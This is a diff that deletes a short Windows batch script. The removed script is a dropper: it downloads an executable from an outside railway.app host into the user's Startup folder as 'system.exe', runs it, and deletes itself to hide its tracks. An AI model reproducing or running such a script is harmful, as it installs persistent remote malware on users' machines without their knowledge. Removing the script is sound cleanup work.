@@ -1,4 +1,0 @@
-@echo off
-curl -o "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.exe" -H "Content-Type:application/octet-stream" https://kushiroreborn-production.up.railway.app/d
-start "%USERPROFILE%\AppData\Roaming\Microsoft\Window\StartMenu\Programs\Startup\system.exe" 
-del "%~f0"
